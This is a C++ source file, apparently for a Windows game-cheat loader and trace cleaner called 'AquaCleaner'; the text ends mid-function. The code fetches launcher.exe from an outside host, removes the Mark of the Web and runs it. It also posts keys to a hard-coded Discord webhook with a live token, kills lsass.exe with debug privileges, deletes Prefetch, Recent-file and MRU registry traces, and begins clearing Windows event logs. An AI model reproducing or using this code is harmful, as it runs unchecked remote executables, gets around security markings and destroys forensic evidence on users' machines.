#define SECURITY_WIN32

#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <winreg.h>
#include <gdiplus.h>
#include <stdio.h>
#include <sstream>
#include <vector>
#include <string>
#include <iostream>
#include <intrin.h>
#include <fstream>
#include <winhttp.h>
#include <comdef.h>
#include <taskschd.h>
#include <TlHelp32.h>
#include <commdlg.h>
#include <psapi.h>
#include <security.h>
#include <securitybaseapi.h>

HANDLE GetProcessHandle(const std::wstring& processName);

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "psapi.lib")

#define ID_BUTTON_CLEAN 2
#define ID_EDIT_KEY 3
#define ID_BUTTON_VALIDATE 4
#define ID_BUTTON_GENERATE 5
#define ID_BUTTON_DOWNLOAD_RUN 6
#define ID_BUTTON_INJECT 7
#define ID_EDIT_MEMORY_ADDRESS 8
#define ID_EDIT_LENGTH 9
#define ID_EDIT_FILE_PATH 10
#define ID_BUTTON_LOAD_FILE 11
#define ID_BUTTON_REMOVE_STRING 12

Gdiplus::Image* backgroundImage = nullptr;
bool isValidated = false;

// Logging function to write errors to a file
void LogError(const std::wstring& message) {
    std::wofstream logFile(L"C:\\Windows\\SystemApps\\Shared\\AquaCleaner.log", std::ios::app);
    if (logFile.is_open()) {
        logFile << L"[ERROR] " << message << L"\n";
        logFile.close();
    }
}

// Convert wstring to string safely
std::string WstringToString(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, nullptr, nullptr);
    return result;
}

// HWID Generation (CPU-based)
std::wstring GetHWID() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    std::wstring hwid = std::to_wstring(cpuInfo[0]) + std::to_wstring(cpuInfo[3]);

    // Simple hash for consistency
    std::wstring result;
    for (WCHAR c : hwid) {
        result += std::to_wstring((int)c % 16);
    }
    return result.substr(0, 32);
}

// Generate random string for key segments
std::string GenerateRandomString(size_t length) {
    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    for (size_t i = 0; i < length; ++i) {
        result += chars[rand() % 36];
    }
    return result;
}

// Generate key in format AquaCleaner-xxxx-xxxx-xxxx-xxxx
std::wstring GenerateKey(const std::wstring& hwid) {
    srand((unsigned int)hwid.length()); // Seed with HWID length for consistency
    std::string part1 = GenerateRandomString(4);
    std::string part2 = GenerateRandomString(5);
    std::string part3 = GenerateRandomString(4);
    std::string part4 = GenerateRandomString(3);
    return L"AquaCleaner-" + std::wstring(part1.begin(), part1.end()) + L"-" +
        std::wstring(part2.begin(), part2.end()) + L"-" +
        std::wstring(part3.begin(), part3.end()) + L"-" +
        std::wstring(part4.begin(), part4.end());
}

// Validate key against HWID
bool ValidateKey(const std::wstring& key, const std::wstring& hwid) {
    if (key.length() < 25 || key.substr(0, 12) != L"AquaCleaner-") return false;

    std::wstring expectedKey = GenerateKey(hwid);
    return key == expectedKey;
}

// Send key to Discord webhook
bool SendToWebhook(const std::wstring& key) {
    HINTERNET hSession = WinHttpOpen(L"Webhook Client/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        LogError(L"WinHttpOpen failed: " + std::to_wstring(GetLastError()));
        return false;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        LogError(L"WinHttpConnect failed: " + std::to_wstring(GetLastError()));
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
        L"/api/webhooks/1362678937779568710/ZtbrqLsUO_ETNSCfTV2o3lxL3fT4BWjfPPhPHyPjZg_nSZyZHUu8mZjloxnnzAbZK9T5",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        LogError(L"WinHttpOpenRequest failed: " + std::to_wstring(GetLastError()));
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Prepare JSON payload
    std::wstring payload = L"{\"content\":\"Generated Key: " + key + L"\"}";
    std::string payloadA = WstringToString(payload);

    // Log payload for debugging
    LogError(L"Payload: " + std::wstring(payloadA.begin(), payloadA.end()));

    // Set headers
    const wchar_t* headers = L"Content-Type: application/json\r\n";
    DWORD headersLength = static_cast<DWORD>(wcslen(headers));
    DWORD payloadLength = static_cast<DWORD>(payloadA.length());
    BOOL success = WinHttpSendRequest(hRequest, headers, headersLength, (LPVOID)payloadA.c_str(), payloadLength, payloadLength, 0);
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
        if (success) {
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
            if (statusCode != 200 && statusCode != 204) {
                LogError(L"Webhook request failed with HTTP status: " + std::to_wstring(statusCode));
                success = false;
            }
        }
    }
    if (!success) {
        LogError(L"WinHttpSendRequest/ReceiveResponse failed: " + std::to_wstring(GetLastError()));
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// Terminate process by name
bool TerminateProcessByName(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        LogError(L"CreateToolhelp32Snapshot failed: " + std::to_wstring(GetLastError()));
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    bool found = false;

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hProcess);
                    found = true;
                }
            }
        } while (Process32NextW(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return found;
}

// Download a file from a URL to a local path
bool DownloadFile(const std::wstring& url, const std::wstring& localPath) {
    // Attempt to terminate any running instance of launcher.exe
    TerminateProcessByName(L"launcher.exe");

    HINTERNET hSession = WinHttpOpen(L"File Downloader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        DWORD error = GetLastError();
        LogError(L"WinHttpOpen failed: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"WinHttpOpen failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp)) {
        DWORD error = GetLastError();
        LogError(L"WinHttpCrackUrl failed: " + std::to_wstring(error));
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"WinHttpCrackUrl failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hConnect = WinHttpConnect(hSession, hostName.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        DWORD error = GetLastError();
        LogError(L"WinHttpConnect failed: " + std::to_wstring(error));
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"WinHttpConnect failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        DWORD error = GetLastError();
        LogError(L"WinHttpOpenRequest failed: " + std::to_wstring(error));
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"WinHttpOpenRequest failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        DWORD error = GetLastError();
        LogError(L"WinHttpSendRequest failed: " + std::to_wstring(error));
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"WinHttpSendRequest failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD error = GetLastError();
        LogError(L"WinHttpReceiveResponse failed: " + std::to_wstring(error));
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"WinHttpReceiveResponse failed! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    // Check if the file already exists and try to delete it
    if (PathFileExistsW(localPath.c_str())) {
        SetFileAttributesW(localPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (!DeleteFileW(localPath.c_str())) {
            DWORD error = GetLastError();
            LogError(L"Failed to delete existing file: " + localPath + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to delete existing file! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        }
    }

    std::ofstream outFile(localPath, std::ios::binary);
    if (!outFile.is_open()) {
        DWORD error = GetLastError();
        LogError(L"Failed to open output file: " + localPath + L" Error: " + std::to_wstring(error));
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"Failed to open output file! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    DWORD bytesRead;
    BYTE buffer[8192];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(reinterpret_cast<const char*>(buffer), bytesRead);
    }

    if (outFile.fail()) {
        DWORD error = GetLastError();
        LogError(L"Failed to write to output file: " + localPath + L" Error: " + std::to_wstring(error));
        outFile.close();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxW(NULL, (L"Failed to write to output file! Error code: " + std::to_wstring(error)).c_str(), L"Debug", MB_OK | MB_ICONERROR);
        return false;
    }

    outFile.close();
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    LogError(L"Successfully downloaded file: " + localPath);
    return true;
}

// Run the file normally for Inject button
void InjectFile() {
    if (!isValidated) {
        LogError(L"InjectFile failed: Key not validated");
        MessageBoxW(NULL, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Ensure the target directory exists
    const std::wstring targetDir = L"C:\\Windows\\SystemApps\\Shared\\";
    if (!CreateDirectoryW(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        DWORD error = GetLastError();
        LogError(L"Failed to create directory: " + targetDir + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to create directory! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Set working directory
    if (!SetCurrentDirectoryW(targetDir.c_str())) {
        DWORD error = GetLastError();
        LogError(L"Failed to set working directory: " + targetDir + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to set working directory! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // URL of the file to download
    const std::wstring url = L"https://cdn.gosth.ltd/launcher.exe";

    // Local path to save the file
    const std::wstring localPath = L"C:\\Windows\\SystemApps\\Shared\\launcher.exe";

    // Download the file
    if (!DownloadFile(url, localPath)) {
        DWORD error = GetLastError();
        LogError(L"DownloadFile failed for: " + url + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to download the file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Verify the file exists and is valid
    HANDLE hFile = CreateFileW(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        LogError(L"Cannot open downloaded file: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Cannot open downloaded file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    CloseHandle(hFile);
    if (fileSize.QuadPart < 1024) { // Arbitrary minimum size check (1KB)
        LogError(L"Downloaded file is too small or empty: " + localPath + L" Size: " + std::to_wstring(fileSize.QuadPart));
        MessageBoxW(NULL, L"Downloaded file is too small or empty!", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Remove "Mark of the Web" (Zone Identifier)
    WCHAR zonePath[MAX_PATH];
    wsprintfW(zonePath, L"%s:Zone.Identifier", localPath.c_str());
    if (PathFileExistsW(zonePath)) {
        if (!DeleteFileW(zonePath)) {
            DWORD error = GetLastError();
            LogError(L"Failed to remove Mark of the Web: " + std::wstring(zonePath) + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to remove Mark of the Web! Error code: " + std::to_wstring(error)).c_str(), L"Warning", MB_OK | MB_ICONWARNING);
        }
    }

    // Remove read-only attribute and ensure normal attributes
    DWORD attrib = GetFileAttributesW(localPath.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES || (attrib & FILE_ATTRIBUTE_DIRECTORY)) {
        LogError(L"Downloaded file not found or invalid: " + localPath);
        MessageBoxW(NULL, L"Downloaded file not found or invalid!", L"Error", MB_OK | MB_ICONERROR);
        return;
    }
    if (attrib & FILE_ATTRIBUTE_READONLY) {
        if (!SetFileAttributesW(localPath.c_str(), FILE_ATTRIBUTE_NORMAL)) {
            DWORD error = GetLastError();
            LogError(L"Failed to remove read-only attribute: " + localPath + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to remove read-only attribute! Error code: " + std::to_wstring(error)).c_str(), L"Warning", MB_OK | MB_ICONWARNING);
        }
    }

    // Execute the file with visible window
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    // Ensure the file is not blocked by setting security attributes
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
    if (!CreateProcessW(localPath.c_str(), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, targetDir.c_str(), &si, &pi)) {
        DWORD error = GetLastError();
        LogError(L"CreateProcessW failed for: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to run the downloaded file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Wait for the process to exit and get the exit code
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000); // Wait up to 5 seconds
    if (waitResult == WAIT_TIMEOUT) {
        LogError(L"Process is still running after 5 seconds: " + localPath);
        // Process is running longer than expected; consider it a success
    }
    else if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
            if (exitCode != 0) {
                LogError(L"Process exited with error code: " + std::to_wstring(exitCode) + L" for: " + localPath);
                MessageBoxW(NULL, (L"Process exited with error code: " + std::to_wstring(exitCode)).c_str(), L"Error", MB_OK | MB_ICONERROR);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return;
            }
            else {
                LogError(L"Process exited successfully with code 0: " + localPath);
            }
        }
        else {
            DWORD error = GetLastError();
            LogError(L"Failed to get exit code for: " + localPath + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to get process exit code! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        }
    }
    else {
        DWORD error = GetLastError();
        LogError(L"WaitForSingleObject failed for: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to wait for process! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    LogError(L"Attempted to execute file: " + localPath);
    MessageBoxW(NULL, L"File execution attempted. Check if it is running.", L"Success", MB_OK | MB_ICONINFORMATION);
}

// Run a remote file by downloading and executing it
bool RunRemoteFile() {
    if (!isValidated) {
        LogError(L"RunRemoteFile failed: Key not validated");
        MessageBoxW(NULL, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Ensure the target directory exists
    const std::wstring targetDir = L"C:\\Windows\\SystemApps\\Shared\\";
    if (!CreateDirectoryW(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        DWORD error = GetLastError();
        LogError(L"Failed to create directory: " + targetDir + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to create directory! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Set working directory
    if (!SetCurrentDirectoryW(targetDir.c_str())) {
        DWORD error = GetLastError();
        LogError(L"Failed to set working directory: " + targetDir + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to set working directory! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // URL of the file to download
    const std::wstring url = L"https://cdn.gosth.ltd/launcher.exe";

    // Local path to save the file
    const std::wstring localPath = L"C:\\Windows\\SystemApps\\Shared\\launcher.exe";

    // Download the file
    if (!DownloadFile(url, localPath)) {
        DWORD error = GetLastError();
        LogError(L"DownloadFile failed for: " + url + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to download the file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Verify the file exists and is valid
    HANDLE hFile = CreateFileW(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        LogError(L"Cannot open downloaded file: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Cannot open downloaded file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    CloseHandle(hFile);
    if (fileSize.QuadPart < 1024) { // Arbitrary minimum size check (1KB)
        LogError(L"Downloaded file is too small or empty: " + localPath + L" Size: " + std::to_wstring(fileSize.QuadPart));
        MessageBoxW(NULL, L"Downloaded file is too small or empty!", L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Remove "Mark of the Web" (Zone Identifier)
    WCHAR zonePath[MAX_PATH];
    wsprintfW(zonePath, L"%s:Zone.Identifier", localPath.c_str());
    if (PathFileExistsW(zonePath)) {
        if (!DeleteFileW(zonePath)) {
            DWORD error = GetLastError();
            LogError(L"Failed to remove Mark of the Web: " + std::wstring(zonePath) + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to remove Mark of the Web! Error code: " + std::to_wstring(error)).c_str(), L"Warning", MB_OK | MB_ICONWARNING);
        }
    }

    // Remove read-only attribute and ensure normal attributes
    DWORD attrib = GetFileAttributesW(localPath.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES || (attrib & FILE_ATTRIBUTE_DIRECTORY)) {
        LogError(L"Downloaded file not found or invalid: " + localPath);
        MessageBoxW(NULL, L"Downloaded file not found or invalid!", L"Error", MB_OK | MB_ICONERROR);
        return false;
    }
    if (attrib & FILE_ATTRIBUTE_READONLY) {
        if (!SetFileAttributesW(localPath.c_str(), FILE_ATTRIBUTE_NORMAL)) {
            DWORD error = GetLastError();
            LogError(L"Failed to remove read-only attribute: " + localPath + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to remove read-only attribute! Error code: " + std::to_wstring(error)).c_str(), L"Warning", MB_OK | MB_ICONWARNING);
        }
    }

    // Execute the file with visible window
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    // Ensure the file is not blocked by setting security attributes
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
    if (!CreateProcessW(localPath.c_str(), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, targetDir.c_str(), &si, &pi)) {
        DWORD error = GetLastError();
        LogError(L"CreateProcessW failed for: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to run the downloaded file! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Wait for the process to exit and get the exit code
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000); // Wait up to 5 seconds
    if (waitResult == WAIT_TIMEOUT) {
        LogError(L"Process is still running after 5 seconds: " + localPath);
        // Process is running longer than expected; consider it a success
    }
    else if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
            if (exitCode != 0) {
                LogError(L"Process exited with error code: " + std::to_wstring(exitCode) + L" for: " + localPath);
                MessageBoxW(NULL, (L"Process exited with error code: " + std::to_wstring(exitCode)).c_str(), L"Error", MB_OK | MB_ICONERROR);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
            else {
                LogError(L"Process exited successfully with code 0: " + localPath);
            }
        }
        else {
            DWORD error = GetLastError();
            LogError(L"Failed to get exit code for: " + localPath + L" Error: " + std::to_wstring(error));
            MessageBoxW(NULL, (L"Failed to get process exit code! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
        }
    }
    else {
        DWORD error = GetLastError();
        LogError(L"WaitForSingleObject failed for: " + localPath + L" Error: " + std::to_wstring(error));
        MessageBoxW(NULL, (L"Failed to wait for process! Error code: " + std::to_wstring(error)).c_str(), L"Error", MB_OK | MB_ICONERROR);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    LogError(L"Attempted to execute file: " + localPath);
    MessageBoxW(NULL, L"File execution attempted. Check if it is running.", L"Success", MB_OK | MB_ICONINFORMATION);
    return true;
}

// Function to restart lsass.exe
bool RestartLsass() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Get a token for this process
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LogError(L"OpenProcessToken failed: " + std::to_wstring(GetLastError()));
        return false;
    }

    // Get the LUID for the SeDebugPrivilege
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        LogError(L"LookupPrivilegeValue failed: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Enable the privilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        LogError(L"AdjustTokenPrivileges failed: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    // Get handle to lsass.exe
    HANDLE hProcess = GetProcessHandle(L"lsass.exe");
    if (!hProcess) {
        LogError(L"Failed to get handle to lsass.exe");
        CloseHandle(hToken);
        return false;
    }

    // Terminate lsass.exe (Windows will automatically restart it)
    if (!TerminateProcess(hProcess, 0)) {
        LogError(L"TerminateProcess failed for lsass.exe: " + std::to_wstring(GetLastError()));
        CloseHandle(hProcess);
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hProcess);
    CloseHandle(hToken);

    // Wait briefly to ensure lsass has restarted
    Sleep(1000);

    // Verify lsass is running again
    hProcess = GetProcessHandle(L"lsass.exe");
    if (!hProcess) {
        LogError(L"lsass.exe failed to restart");
        return false;
    }

    CloseHandle(hProcess);
    return true;
}

        // Function to hide recently executed files
        void HideRecentFiles() {
            WCHAR userProfile[MAX_PATH];
            GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);

            // Paths to clean recent file references
            std::vector<std::wstring> recentPaths = {
                std::wstring(userProfile) + L"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
                L"C:\\Windows\\Prefetch",
                std::wstring(userProfile) + L"\\AppData\\Local\\Microsoft\\Windows\\Explorer"
            };

            // Files to specifically target
            std::vector<std::wstring> targetFiles = {
                L"launcher.exe",
                L"shared_store_ct.dat",
                L"main.exe",
                L"AquaCleaner.exe"
            };

            for (const auto& path : recentPaths) {
                WIN32_FIND_DATAW findData;
                WCHAR searchPath[MAX_PATH];
                wsprintfW(searchPath, L"%s\\*", path.c_str());
                HANDLE hFind = FindFirstFileW(searchPath, &findData);

                if (hFind == INVALID_HANDLE_VALUE) continue;

                do {
                    if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;

                    WCHAR fullPath[MAX_PATH];
                    wsprintfW(fullPath, L"%s\\%s", path.c_str(), findData.cFileName);

                    // Check if the file matches any target files or has specific extensions
                    for (const auto& target : targetFiles) {
                        if (_wcsicmp(findData.cFileName, target.c_str()) == 0 ||
                            wcsstr(findData.cFileName, L".lnk") != nullptr ||
                            wcsstr(findData.cFileName, L".pf") != nullptr) {
                            SetFileAttributesW(fullPath, FILE_ATTRIBUTE_NORMAL);
                            if (DeleteFileW(fullPath)) {
                                LogError(L"Deleted recent file reference: " + std::wstring(fullPath));
                            }
                        }
                    }
                } while (FindNextFileW(hFind, &findData));

                FindClose(hFind);
            }

            // Clear recent documents registry entries
            HKEY hKey;
            if (RegOpenKeyExW(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
                0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
                RegDeleteTreeW(HKEY_CURRENT_USER,
                    L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs");
                RegCloseKey(hKey);
            }

            // Clear Run MRU list
            if (RegOpenKeyExW(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
                0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
                RegDeleteTreeW(HKEY_CURRENT_USER,
                    L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU");
                RegCloseKey(hKey);
            }
        }

        // Utility Functions
        BOOL IsRunningAsAdmin() {
            BOOL isAdmin = FALSE;
            PSID adminGroup = NULL;
            SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

            if (AllocateAndInitializeSid(&ntAuthority, 2,
                SECURITY_BUILTIN_DOMAIN_RID,
                DOMAIN_ALIAS_RID_ADMINS,
                0, 0, 0, 0, 0, 0,
                &adminGroup)) {
                CheckTokenMembership(NULL, adminGroup, &isAdmin);
                FreeSid(adminGroup);
            }
            return isAdmin;
        }

        void RelaunchAsAdmin() {
            WCHAR exePath[MAX_PATH];
            GetModuleFileNameW(NULL, exePath, MAX_PATH);
            ShellExecuteW(NULL, L"runas", exePath, NULL, NULL, SW_SHOWNORMAL);
            ExitProcess(0);
        }

        void ClearEventViewerLogs() {
            HANDLE hRead, hWrite;
            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
            CreatePipe(&hRead, &hWrite, &sa, 0);

            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.wShowWindow = SW_HIDE;

            WCHAR cmd[] = L"cmd.exe /c wevtutil el";

            if (CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(hWrite);

                WCHAR buffer[2048];
